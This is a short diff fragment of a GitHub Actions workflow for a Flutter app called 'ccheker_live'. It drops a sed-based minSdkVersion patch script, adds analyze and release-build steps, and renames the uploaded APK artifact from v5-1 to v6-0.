-          sed -i 's/minSdkVersion flutter.minSdkVersion/minSdkVersion 23/' "$GR" || true
-          sed -i 's/minSdkVersion 21/minSdkVersion 23/' "$GR" || true
-          sed -i 's/minSdkVersion 19/minSdkVersion 23/' "$GR" || true
-          SH
-          bash /tmp/android_patch.sh
-
+      - name: Compilar
+        run: |
+          cd ccheker_live
           flutter pub get
+          flutter analyze --no-fatal-infos || true
           flutter build apk --release
           ls -lh build/app/outputs/flutter-apk/
 
       - name: Subir APK
         uses: actions/upload-artifact@v4
         with:
-          name: ccheker-live-v5-1
+          name: ccheker-live-v6-0
           path: ccheker_live/build/app/outputs/flutter-apk/app-release.apk
